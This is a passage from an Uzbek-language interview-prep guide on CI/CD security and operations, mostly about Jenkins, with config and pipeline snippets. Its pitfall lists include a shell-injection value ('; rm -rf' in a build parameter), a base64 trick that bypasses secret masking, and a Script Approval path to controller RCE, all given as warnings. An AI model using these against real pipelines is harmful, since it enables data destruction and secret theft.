- CI pod'lariga cluster ichida cheklanmagan tarmoq — NetworkPolicy bilan egress'ni chekla.
- Runner token'i (`glrt-`) sizsa — hujumchi o'z runner'ini ro'yxatdan o'tkazib job'larni (va secret'larni) tutib oladi; token'ni rotatsiya qil.

**Senior nuqta:** CI runner — ishonchsiz kodni bajaradigan production tizim. Unga shunday munosabat: izolyatsiya chegarasi, minimal huquq, audit va muntazam patch.

32030.a:
**Qisqa javob:** Jenkins — open-source, self-hosted CI/CD server (Java). **Controller** — UI, job konfiguratsiyasi, navbat, plugin'lar va build'larni rejalashtirish. **Agent** — build'larni haqiqatda bajaradigan mashina/konteyner. Controller ish taqsimlaydi, agent ishlaydi.

**Muammo:** Hamma build controller'da ishlasa: bitta og'ir build UI'ni sekinlashtiradi, zararli `Jenkinsfile` controller'dagi barcha secret va konfiguratsiyaga kira oladi, turli muhitlar (Linux, Windows, GPU) kerak bo'lsa bitta mashina yetmaydi.

**Qanday ishlaydi:**
```
+-------------------+   SSH (controller ulanadi)   +-----------+
| Controller        | ---------------------------> | Agent 1   |
|  UI, queue, cron  |                              | linux     |
|  plugins, creds   |   inbound/WebSocket          +-----------+
|  executors = 0    | <--------------------------- | Agent 2   |
+-------------------+   (agent ulanadi)            | K8s pod   |
        |                                          +-----------+
   JENKINS_HOME (job, build tarixi, config)
```
Executor — agent'dagi parallel build slot'i.

**Amalda:**
```bash
docker run -d -p 8080:8080 -v jenkins_home:/var/jenkins_home jenkins/jenkins:lts-jdk21
docker exec <id> cat /var/jenkins_home/secrets/initialAdminPassword
```
Inbound agent ulash:
```bash
java -jar agent.jar -url https://ci.acme.uz/ -secret <secret> -name linux-1 -webSocket -workDir /home/jenkins
```
Manage Jenkins -> Nodes: controller'ning "Number of executors" = 0.

**Tuzoqlar:**
- Controller'da build ishlatish — xavfsizlik teshigi va beqarorlik.
- Qo'lda sozlangan "snowflake" agent'lar — tiklab bo'lmaydi; Docker/K8s agent ishlat.
- Plugin'larni o'ylamasdan o'rnatish — ko'p CVE va upgrade muammolari shulardan.
- `JENKINS_HOME` backup qilinmagan.

**Senior nuqta:** Jenkins'ning kuchi (1800+ plugin, to'liq nazorat) ayni paytda uning operatsion yuki. OSS'da HA yo'q — tez tiklanish uchun controller'ni immutable image + JCasC + backup bilan qur.

32031.a:
**Qisqa javob:** **Freestyle job** — UI'da formalar orqali sozlanadigan eski uslubdagi job: konfiguratsiya Jenkins ichida, Git'da emas. **Pipeline** — butun jarayon `Jenkinsfile` kodida, repo bilan birga versiyalanadi va review qilinadi. Yangi ishlar uchun faqat Pipeline.

**Muammo:** Freestyle'da kimdir build qadamini UI'da o'zgartirdi — kim, qachon, nega? Tarix yo'q. Build -> test -> tasdiq -> deploy oqimi, parallel qadamlar, qayta urinish — Freestyle'da qiyin yoki umuman mumkin emas.

**Qanday ishlaydi:**
| | Freestyle | Pipeline |
|---|---|---|
| Konfig | UI (XML, JENKINS_HOME'da) | `Jenkinsfile` repo'da |
| Review/tarix | yo'q | PR, git log |
| Oqim | ketma-ket qadamlar | stage, parallel, input, retry |
| Restart'ga chidamlilik | yo'q | durable (davom ettira oladi) |
| Branch/PR | qo'lda | Multibranch: avtomatik |

**Amalda:**
```groovy
// Jenkinsfile (repo ildizida)
pipeline {
  agent any
  stages {
    stage('Build') { steps { sh 'make build' } }
    stage('Test')  { steps { sh 'make test' } }
  }
}
```
Jenkins'da: New Item -> **Multibranch Pipeline** -> Git repo URL. Jenkins har branch va PR uchun `Jenkinsfile` ni topib alohida job yaratadi.

**Tuzoqlar:**
- Pipeline'ni "Pipeline script" maydoniga UI'da yozish — Freestyle'ning muammosini qaytaradi; "Pipeline script from SCM" ishlat.
- Hamma logikani Groovy'ga yozish — `sh 'make ...'` ga chiqarish yaxshiroq (lokal ham ishlaydi).
- Eski Freestyle job'larni hech kim o'chirmaydi — inventarizatsiya qil.

**Senior nuqta:** Pipeline-as-Code CI konfiguratsiyasini kod bilan bir xil sifat nazoratiga olib kiradi. Logikani Makefile/skriptlarga chiqarish keyinchalik boshqa CI'ga ko'chishni ham arzonlashtiradi.

32033.a:
**Qisqa javob:** Secret'lar Jenkins **Credentials** store'ida (yoki tashqi Vault) saqlanadi va pipeline'ga ID orqali beriladi: `environment { X = credentials('id') }` yoki `withCredentials([...]) { }`. Jenkins log'da qiymatni `****` bilan maskalaydi. Shell'ga secret **bitta qo'shtirnoqli** Groovy satr bilan beriladi.

**Muammo:** Parolni `Jenkinsfile` ga yozish — u Git'da hammaga ko'rinadi. Credential store secret'ni koddan ajratadi va kim ishlatishini scope bilan cheklaydi.

**Qanday ishlaydi:**
```
Credentials (Global / Folder scope)
  id: registry-creds  (username+password)
  id: api-token       (secret text)
     v
withCredentials -> env var faqat blok ichida mavjud -> log'da ****
```

**Amalda:**
```groovy
pipeline {
  agent any
  environment {
    REG = credentials('registry-creds')   // REG_USR va REG_PSW avtomatik
  }
  stages {
    stage('Push') {
      steps {
        sh 'echo "$REG_PSW" | docker login -u "$REG_USR" --password-stdin ghcr.io'
        withCredentials([string(credentialsId: 'api-token', variable: 'TOKEN')]) {
          sh 'curl -sf -H "Authorization: Bearer $TOKEN" https://api.acme.uz/deploy'
        }
      }
    }
  }
}
```
Fayl turidagi credential: `file(credentialsId: 'kubeconfig', variable: 'KUBECONFIG')`.

**Eng muhim tuzoq — qo'shtirnoq:**
```groovy
sh "curl -H 'Authorization: Bearer ${TOKEN}' ..."   // YOMON: Groovy interpolation
sh 'curl -H "Authorization: Bearer $TOKEN" ...'     // TO'G'RI: shell o'zi o'qiydi
```
Ikki qo'shtirnoqda secret Groovy tomonidan satrga qo'yiladi va jarayon argumentlariga (`ps`) tushadi; Jenkins ham bu haqda ogohlantiradi.

**Boshqa tuzoqlar:**
- `set -x` yoki `echo $TOKEN | base64` — maskalash ishlamaydi.
- Global scope credential'ni har job ishlata oladi — folder scope ishlat.
- Uzoq muddatli statik kalitlar — OIDC/Vault qisqa TTL token'larga o'tish.

**Senior nuqta:** Maskalash — xavfsizlik chegarasi emas: build'da kod ishlatish huquqi bor odam secret'ni chiqarib oladi. Shuning uchun prod credential'lar faqat himoyalangan branch job'lariga berilsin.

32034.a:
**Qisqa javob:** Asosiy trigger'lar: **webhook** (push/PR bo'lganda Git server Jenkins'ni chaqiradi — eng yaxshisi), **pollSCM** (Jenkins o'zi vaqti-vaqti bilan repo'ni tekshiradi), **cron** (jadval bo'yicha), **upstream** (boshqa job tugagach), **qo'lda** (parametrlar bilan "Build with Parameters").

**Muammo:** Build kodni o'zgartirgan zahoti boshlanishi kerak. Polling har 5 daqiqada yuzlab repo'ni tekshirib Git serverni yuklaydi va kechikish beradi; webhook darhol va arzon.

**Qanday ishlaydi:**
```
push -> GitHub webhook -> Jenkins (/github-webhook/) -> job start   (soniyalar)
pollSCM: har 5 daqiqa -> git ls-remote -> o'zgarish bormi? -> start (kechikish)
cron:    'H 3 * * *' -> har kecha ~03:xx -> start
```

**Amalda:**
```groovy
pipeline {
  agent any
  triggers {
    cron('H 3 * * *')                       // tungi to'liq test
    upstream(upstreamProjects: 'lib-build', threshold: hudson.model.Result.SUCCESS)
  }
  parameters {
    choice(name: 'ENV', choices: ['stg', 'prod'], description: 'Qaysi muhit')
    booleanParam(name: 'DRY_RUN', defaultValue: true)
  }
  stages {
    stage('Deploy') { steps { sh "./deploy.sh ${params.ENV}" } }
  }
}
```
Multibranch job'da webhook GitHub Branch Source plugin orqali avtomatik ishlaydi.

**`H` belgisi:** job nomidan hash olib vaqtni tarqatadi: `H 3 * * *` — 03:00-03:59 orasidagi barqaror daqiqa. Hamma job 00:00 da birdaniga yugurmaydi.

**Tuzoqlar:**
- `0 0 * * *` hamma job'da — yarim tunda agent'lar uchun navbat bo'roni.
- Parametrlar birinchi build'dan keyin ko'rinadi (Jenkinsfile o'qilgandan keyin).
- Parametrni shell'ga tekshirmasdan qo'yish — injection (`${params.X}` ichida `; rm -rf`); qiymatni validatsiya qil.
- Jenkins internetdan yopiq — webhook yetmaydi; relay yoki polling.

**Senior nuqta:** Webhook + kam chastotali "xavfsizlik" polling (soatiga) — yo'qolgan webhook'larni ushlash uchun yaxshi kombinatsiya.

32038.a:
**Qisqa javob:** Kubernetes plugin har build uchun K8s'da **vaqtinchalik pod** yaratadi: unda avtomatik qo'shiladigan `jnlp` konteyner (controller bilan aloqa) va siz ko'rsatgan tool konteynerlari (go, docker, kubectl) bo'ladi. Build tugagach pod o'chiriladi. `container('go') { sh ... }` qadamni kerakli konteynerda bajaradi.

**Muammo:** Doimiy VM agent'lar: qo'lda o'rnatilgan tool'lar, eski build qoldiqlari, bo'sh turganda ham pul. Dinamik agent'lar toza muhit va yuklamaga qarab skaleni beradi.

**Qanday ishlaydi:**
```
build navbatda -> plugin K8s API: pod yarat
  pod:
   +- jnlp   (jenkins/inbound-agent) -> WebSocket -> controller
   +- go     (golang:1.23, sleep infinity)
   +- kaniko (image build, privileged'siz)
  umumiy volume: /home/jenkins/agent (workspace)
build tugadi -> pod o'chiriladi
```

**Amalda:**
```groovy
pipeline {
  agent {
    kubernetes {
      yaml '''
apiVersion: v1
kind: Pod
spec:
  serviceAccountName: ci-build
  containers:
  - name: go
    image: golang:1.23
    command: [sleep]
    args: [infinity]
    resources: { requests: { cpu: "1", memory: 2Gi } }
    volumeMounts: [{ name: gocache, mountPath: /root/.cache }]
  volumes:
  - name: gocache
    persistentVolumeClaim: { claimName: go-cache }
'''
    }
  }
  stages {
    stage('Test') { steps { container('go') { sh 'go test ./...' } } }
  }
}
```
```bash
kubectl get pods -n ci -w      # build paytida pod paydo bo'ladi va yo'qoladi
```

**Tuzoqlar:**
- Konteynerda `command: sleep infinity` yo'q — konteyner darhol chiqadi.
- Docker-in-Docker yoki `docker.sock` mount — klaster xavfsizligini buzadi; Kaniko/BuildKit rootless ishlat.
- Pod start vaqti (image pull) — har build +20-60s; image'larni kichik va node'da keshlangan qil.
- Kesh yo'q — har safar `go mod download`; PVC yoki proxy repo kerak.

**Senior nuqta:** CI pod'larini alohida namespace/node pool'da, cheklangan ServiceAccount va NetworkPolicy bilan ishlat — CI kodi ishonchsiz kod hisoblanadi. Resurs request'lari aniq bo'lsin, aks holda build'lar bir-birini bo'g'adi.

32040.a:
**Qisqa javob:** Jenkinsfile oddiy Groovy kabi ishlamaydi, chunki (1) u **CPS** (Continuation Passing Style) bilan qayta yozilib, har qadamdan keyin holati diskka **serialize** qilinadi — controller restart'dan keyin davom etish uchun; (2) u **controller'da** ishlaydi (`sh` esa agent'da); (3) Script Security **sandbox** ichida — ruxsat berilmagan metodlar bloklanadi.

**Muammo:** Dasturchi oddiy Groovy yozadi: `def m = (text =~ /v(\d+)/)` — va `NotSerializableException` oladi. Yoki `collect { }` kutilganidan boshqacha ishlaydi, yoki "Scripts not permitted to use method ..." xatosi.

**Qanday ishlaydi:**
```
Jenkinsfile (Groovy)
   v  CPS transform
har step (sh, echo, stage) chegarasida:
   program state -> serialize -> JENKINS_HOME/jobs/.../program.dat
controller restart -> deserialize -> davom
   => o'zgaruvchilar Serializable bo'lishi shart
   => og'ir hisob controller CPU/heap'ida
sandbox: har metod chaqiruvi whitelist bo'yicha tekshiriladi
```

**Amalda:**
```groovy
// YOMON: Matcher serializable emas
def m = (env.TAG =~ /v(\d+)\.(\d+)/)
sh "echo ${m[0][1]}"        // NotSerializableException

// YAXSHI: natijani darhol oddiy turga aylantir
@NonCPS
def major(String tag) { (tag =~ /v(\d+)/)[0][1] }   // ichida step chaqirma!
def v = major(env.TAG)
sh "echo ${v}"

// ENG YAXSHI: logika shell'da
def v = sh(script: "echo $TAG | cut -d. -f1 | tr -d v", returnStdout: true).trim()
```
Katta JSON'ni Groovy'da parse qilish o'rniga: `sh 'jq .version package.json'`.

**Tuzoqlar:**
- `@NonCPS` metod ichida `sh`/`echo` chaqirish — kutilmagan xatti-harakat; NonCPS ichida faqat sof hisob.
- Script Approval sahifasida `staticMethod java.lang.Runtime getRuntime` kabi narsalarni ko'r-ko'rona approve qilish — controller'da RCE.
- Groovy'dagi katta loop'lar — controller'ni sekinlashtiradi (hamma job'lar uchun).
- Groovy closure'lar ba'zi CPS-mos bo'lmagan metodlarda (`sort { }`, `each` eski versiyalarda) noto'g'ri ishlaydi.

**Senior nuqta:** Qoida: Jenkinsfile — faqat orkestratsiya (qaysi qadam, qaysi agent'da). Hamma logika konteyner ichidagi skript/CLI'da — test qilinadi, lokal ishlaydi va controller'ni yuklamaydi.

32041.a:
**Qisqa javob:** Asosiy tamoyillar: controller'da **build yo'q** (executors = 0), **minimal va yangilangan plugin'lar**, **SSO + matrix/RBAC** avtorizatsiya, Script Console va Script Approval faqat admin, credential'lar **folder scope**'da yoki Vault'da, butun konfiguratsiya **JCasC** bilan kodda, `JENKINS_HOME` backup va monitoring (heap, queue, executor).

**Muammo:** Jenkins controller — tashkilotdagi eng ko'p secret saqlaydigan mashinalardan biri (deploy kalitlari, registry, cloud). Uni buzish = butun infratuzilmaga kirish. Shu bilan birga OSS Jenkins'da HA yo'q — u yiqilsa butun CI to'xtaydi.

**Qanday ishlaydi (qatlamlar):**
```
Kirish:     SSO (OIDC/SAML) -> Matrix/Role-based auth -> folder ruxsatlari
Kod:        sandbox, Script Approval nazorati, trusted library faqat platforma
Ijro:       executors=0, ephemeral K8s agent, agent-to-controller security
Secret:     folder scope / Vault, qisqa TTL, OIDC
Konfig:     JCasC (Git) + plugins.txt (pin) + immutable image
Tiklash:    JENKINS_HOME backup, DR = yangi image + JCasC + seed job
Kuzatuv:    Prometheus plugin: queue, executors, heap, GC
```

**Amalda:**
```dockerfile
FROM jenkins/jenkins:2.516.2-lts-jdk21
COPY plugins.txt /usr/share/jenkins/ref/plugins.txt
RUN jenkins-plugin-cli --plugin-file /usr/share/jenkins/ref/plugins.txt
COPY casc/ /var/jenkins_home/casc/
ENV CASC_JENKINS_CONFIG=/var/jenkins_home/casc
```
```yaml
# casc/jenkins.yaml
jenkins:
  numExecutors: 0
  remotingSecurity: { enabled: true }
  authorizationStrategy:
    roleBased: { roles: { global: [{ name: admin, permissions: [Overall/Administer], entries: [{ group: ci-admins }] }] } }
security:
  scriptApproval: { approvedSignatures: [] }
```
Monitoring: `jenkins_queue_size_value`, `jenkins_executor_in_use_value`, JVM heap, GC pause.

**Tuzoqlar:**
- Anonymous read yoki "Logged-in users can do anything" — eng keng tarqalgan xato.
- UI'dan "Update all plugins" prod'da — kutilmagan breaking change.
- Jenkins'ni to'liq internetga ochish; faqat SSO orqasida va webhook endpoint'ini alohida.
- Backup bor, lekin tiklash mashqi yo'q.

**Senior nuqta:** Jenkins Security Advisory'larga obuna bo'l va kritik CVE uchun aniq SLA qo'y. Controller'ni "pet" emas "cattle" qil: image + JCasC'dan 15 daqiqada qayta qurish mumkin bo'lsin.

32042.a:
**Qisqa javob:** Taxmin bilan emas, dalil bilan: (1) metrikalar — heap, GC pause, queue uzunligi, executor bandligi; (2) **thread dump** — qaysi plugin/job osilgan; (3) **GC log** — heap yetmayaptimi yoki leak; (4) disk — `JENKINS_HOME` hajmi va I/O. Keyin sababga qarab: tarixni cheklash, og'ir Groovy'ni `sh` ga chiqarish, katta artifact'larni tashqariga, muammoli plugin'ni almashtirish.

**Muammo:** "Jenkins sekin" — UI 10s ochiladi, build'lar navbatda turadi, vaqti-vaqti bilan controller qotadi. Heap'ni 16GB'ga ko'tarish ko'pincha muammoni faqat kechiktiradi.

**Qanday ishlaydi (diagnostika daraxti):**
```
Sekinlik
 +- UI sekin, CPU yuqori   -> thread dump: qaysi thread band (plugin? Groovy?)
 +- vaqti-vaqti bilan qotish -> GC log: uzoq Full GC -> heap/leak
 +- build'lar navbatda       -> executor yetmaydi? label noto'g'ri? agent offline?
 +- hamma narsa sekin I/O    -> disk: JENKINS_HOME katta, durability yozuvlari
```

**Amalda:**
```bash
# Thread dump (yoki UI: /threadDump)
jcmd $(pgrep -f jenkins.war) Thread.print > td1.txt; sleep 10; jcmd $(pgrep -f jenkins.war) Thread.print > td2.txt
# GC
jcmd <pid> GC.heap_info
# JVM flag'lar: -Xlog:gc*:file=/var/jenkins_home/gc.log -XX:+UseG1GC
du -sh /var/jenkins_home/jobs/* | sort -h | tail     # eng katta job'lar
```
Script Console'da (admin) navbat sababini ko'rish: `Jenkins.instance.queue.items.each { println "${it.task.name}: ${it.why}" }`.

**Tez yutuqlar:**
```groovy
options {
  buildDiscarder(logRotator(numToKeepStr: '30'))
  durabilityHint('PERFORMANCE_OPTIMIZED')   // I/O kamayadi; crash'da resume yo'q
}
```
- Katta JSON/Groovy loop'lar -> `sh 'jq ...'`.
- stash/archive o'rniga S3/Nexus.
- Har push'da Organization re-scan o'rniga webhook.

**Tuzoqlar:**
- Root cause'siz heap oshirish — leak'ni yashiradi, GC pauzalari uzayadi.
- Bir vaqtda ko'p o'zgarish — qaysi biri yordam berganini bilmaysan.
- Plugin muammosini yangilash bilan "tuzatish" — yangi versiya boshqa muammo keltirishi mumkin; changelog o'qi.

**Senior nuqta:** Ko'p holatda ildiz sabab — arxitektura: bitta controller'da yuzlab jamoa. Bir nechta controller'ga bo'lish yoki CI'ni boshqa platformaga ko'chirish tuning'dan ko'ra uzoq muddatli yechim.

32043.a:
**Qisqa javob:** **GitHub Actions** — kod GitHub'da bo'lsa: eng kam ops, kuchli marketplace, OIDC. **GitLab CI** — GitLab ishlatilsa yoki SCM + CI + registry + security'ni bitta platformada xohlasangiz. **Jenkins** — on-prem/air-gapped, juda o'ziga xos integratsiyalar yoki katta mavjud investitsiya bo'lsa; narxi — yuqori operatsion yuk.

**Muammo:** CI tanlovi ko'p yilga qulf: pipeline'lar, plugin'lar, jamoa ko'nikmasi. Noto'g'ri tanlov — doimiy ops xarajati yoki compliance muammosi.

| | GitHub Actions | GitLab CI | Jenkins |
|---|---|---|---|
| Hosting | SaaS + self-hosted runner | SaaS / self-managed | faqat self-hosted |
| Konfig | YAML | YAML | Groovy |
| Ekotizim | Marketplace action'lar | CI/CD components, templates | 1800+ plugin |
| Ops yuk | past | o'rta (self-managed'da yuqori) | yuqori |
| Kuchli tomon | GitHub bilan integratsiya, OIDC, matrix | yagona platforma, DevSecOps | moslashuvchanlik, on-prem |
| Zaif tomon | GitHub'ga qulf, murakkab oqim cheklangan | GitLab'ga qulf | plugin CVE, HA yo'q, Groovy |

**Qanday tanlash (qaror savollari):**
```
Kod qayerda?           GitHub -> GHA ; GitLab -> GitLab CI
Air-gapped/regulyator? ha -> GitLab self-managed yoki Jenkins
Ops jamoa bormi?       yo'q -> SaaS (GHA/GitLab.com)
Maxsus hardware?       ha -> self-hosted runner (har uchalasida bor)
Mavjud Jenkins katta?  -> bosqichli migratsiya rejasi
```

**Amalda (CI-agnostik qilish):**
```makefile
test:  ; go test ./...
image: ; docker build -t $(IMG) .
```
```yaml
# GitHub Actions
- run: make test
```
```groovy
// Jenkins
sh 'make test'
```
Logika Makefile/Taskfile'da bo'lsa, CI almashtirish faqat "o'rash" qatlamini o'zgartirish.

**Tuzoqlar:**
- Faqat narxga qarash — Jenkins "bepul", lekin uni yuritayotgan muhandis vaqti qimmat.
- Third-party action'larni tag bilan ishlatish (GHA) — supply chain xavfi; commit SHA'ga pin.
- Self-hosted runner'larni public repo'larda ishlatish — ishonchsiz kod sizning infrangizda.

**Senior nuqta:** Eng muhim mezon ko'pincha texnik emas: kod hosting va tashkiliy standart. Platformadan qat'i nazar, OIDC (statik secret yo'q), pin qilingan dependency va ephemeral runner'lar — majburiy.

32044.a:
**Qisqa javob:** Reproducibility: **ephemeral, versiyalangan build muhiti** (Docker/K8s agent, image digest'ga pin), aniq commit SHA'dan build, lockfile va checksum'lar, proxy repo. Supply chain: **imzolash** (cosign), **SLSA provenance**, **SBOM** (syft), qisqa muddatli secret'lar (Vault/OIDC), va Jenkins'ning o'zi (plugin'lar) ham pin va yangilangan.

**Muammo:** "Mening agent'imda ishlaydi" — qo'lda o'rnatilgan Go 1.20 bir agent'da, 1.22 boshqasida. Hujumchi dependency yoki build agent'ni buzsa, imzolanmagan zararli artifact prod'ga yetib boradi (SolarWinds, Codecov holatlari).

**Qanday ishlaydi:**
```
source (git SHA, signed tag)
  v
build env: golang:1.23@sha256:... (ephemeral pod)
  v  deps: go.sum checksum, proxy repo (Nexus/Artifactory)
artifact: image@sha256:...
  +- SBOM (syft)        -> nima ichida
  +- provenance (SLSA)  -> qayerda, qaysi commit'dan, qanday qurildi
  +- signature (cosign) -> kim qurdi
  v
deploy: admission controller (Kyverno/Sigstore policy) imzoni tekshiradi
```

**Amalda:**
```groovy
pipeline {
  agent { kubernetes { yaml '''
spec:
  containers:
  - name: build
    image: golang:1.23@sha256:<digest>
    command: [sleep, infinity]
''' } }
  stages {
    stage('Build') {
      steps { container('build') { sh 'go build -trimpath -mod=readonly ./...' } }
    }
    stage('Sign') {
```
